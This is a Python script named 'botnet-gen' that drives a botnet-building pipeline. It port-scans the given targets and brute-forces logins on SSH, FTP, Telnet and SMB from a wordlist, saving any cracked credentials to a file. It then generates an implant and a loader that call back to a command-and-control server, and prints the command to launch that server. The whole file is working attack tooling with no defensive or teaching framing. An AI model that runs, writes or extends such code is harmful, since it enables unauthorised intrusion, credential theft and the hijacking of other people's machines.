import argparse
import json
import os
import yaml

from modules import scanner, bruteforce, payload

def load_list(path):
    with open(path) as f:
        return [l.strip() for l in f if l.strip()]

def main():
    ap = argparse.ArgumentParser(description="botnet-gen")
    ap.add_argument("--config", default="config.yaml")
    ap.add_argument("--targets", nargs="+", required=True)
    ap.add_argument("--stage", choices=["scan", "brute", "payload", "all"], default="all")
    args = ap.parse_args()

    cfg = yaml.safe_load(open(args.config))
    ports = cfg["scan"]["ports"]
    users = cfg["bruteforce"]["users"]
    wordlist = load_list(cfg["bruteforce"]["wordlist"])
    c2_host = cfg["c2"]["host"]
    c2_port = cfg["c2"]["port"]
    secret = cfg["c2"]["secret"]

    print(f"[*] wordlist: {len(wordlist)} entries, users: {users}")

    if args.stage in ("scan", "all"):
        print(f"[*] scanning {args.targets} ports {ports}")
        results = scanner.scan(
            args.targets, ports,
            timeout=cfg["scan"]["timeout"],
            workers=cfg["scan"]["workers"],
        )
        open_ports = {}
        for h, plist in results.items():
            open_ports[h] = [p[0] for p in plist]
            print(f"[+] {h}: {open_ports[h]}")
        json.dump(open_ports, open("scan_results.json", "w"), indent=2)

    if args.stage in ("brute", "all"):
        open_ports = json.load(open("scan_results.json"))
        hits = []
        for host, plist in open_ports.items():
            for port in plist:
                if port not in (22, 21, 23, 445):
                    continue
                print(f"[*] bruteforce {host}:{port}")
                r = bruteforce.brute(
                    host, port, users, wordlist,
                    timeout=cfg["bruteforce"]["timeout"],
                )
                if r:
                    print(f"[+] creds {host}:{port} {r[0]}:{r[1]}")
                    hits.append({"host": host, "port": port, "user": r[0], "pass": r[1]})
        json.dump(hits, open("creds.json", "w"), indent=2)

    if args.stage in ("payload", "all"):
        os.makedirs("out", exist_ok=True)
        url = f"http://{c2_host}:{c2_port}"
        payload.build_python_implant(url, secret, "out/implant.py")
        payload.build_loader(url, secret, "out/loader.py")
        print("[+] payloads in out/")
        print(f"[*] c2: python c2_server/server.py {c2_host} {c2_port} {secret} out/implant.py")

if __name__ == "__main__":
    main()
